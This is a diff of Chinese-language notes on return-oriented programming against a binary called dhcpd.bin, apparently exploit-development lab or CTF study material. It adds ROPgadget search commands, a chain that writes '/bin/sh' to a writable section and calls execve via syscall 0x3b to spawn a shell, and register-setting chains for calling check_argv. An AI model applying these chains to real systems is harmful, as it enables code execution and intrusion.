@@ -1,11 +1,27 @@
 ## 任意写
 向任意内存地址rw写入内容"/bin/sh"，然后调用sys。
 
-需要寻找往内存中写入数据的gadget（mov）,然后查找控制寄存器的值的gadget
+需要寻找往内存中写入数据的gadget（mov）
 ```
 ROPgadget --binary dhcpd.bin --only "mov|ret"
 ROPgadget --binary dhcpd.bin --only "mov|pop|ret"
 ROPgadget --binary dhcpd.bin | grep -v "jmp" | grep "mov qword"
+
+----------------------
+mov, stos, movs, movzx
+```
+
+然后查找控制寄存器的值的gadget(pop rdi)
+
+然后寻找可写入地址(.data 和.bss)，和写入 p64(0x68732f6e69622f) （"/bin/sh"）
+```
+readelf -S dhcpd.bin
+---------------------------
+pop rsi, ret
+pop rdi, ret
+mov qword ptr [rsi], rdi
+pop rdi, ret
+sys_addr
 ```
 
 调用sys（设置参数rdi）
@@ -26,6 +42,14 @@ ROPgadget --binary dhcpd.bin --only "pop|ret" | grep "rsi"
 ROPgadget --binary dhcpd.bin --only "pop|ret" | grep "rdx"
 ROPgadget --binary dhcpd.bin --only "mov|pop|ret" | grep "eax"
 ROPgadget --binary dhcpd.bin | grep "syscall"
+
+-------------------
+基于1写入/bin/sh，（binsh_addr, 0, 0）
+pop rdi, ret
+pop rsi, ret
+pop rdx, ret
+pop eax, ret  | mov eax, 0x3b
+syscall_addr
 ```
 
 
@@ -37,7 +61,24 @@ ROPgadget --binary dhcpd.bin --only "mov|pop|ret" | grep "rcx"
 ROPgadget --binary dhcpd.bin | grep -v "jmp" | grep "ret" | grep "r8"
 ROPgadget --binary dhcpd.bin | grep -v "jmp" | grep "ret" | grep "xchg" | grep "r8"
 
+-------------------
+pop, mov，xchg, xor
 
+pop rdi, ret
+pop rsi, ret
+pop rdx, ret
+pop rcx, ret
+pop r8, ret
+pop r9, ret
+
+mov rdi, ret
+mov rsi, ret
+mov rdx, ret
+mov rcx, ret
+mov r8, ret
+mov r9, ret
+
+check_argv_addr
 ```
 
 设置可控参数，然后调用check_argv(返回到那个地址)
@@ -50,3 +91,15 @@ ROPgadget --binary dhcpd.bin | grep -v "jmp" | grep "ret" | grep "xchg" | grep "
 | rcx      | 0x100004 |
 | r8       | 0x100005 |
 | r9       | 0x100006         |
+
+
+## 目录
+- binary
+- debug.sh
+- run.sh
+- gadget
+- rop.py
+- rop1.py
+- rop2.py
+- rop3.py
+- inp
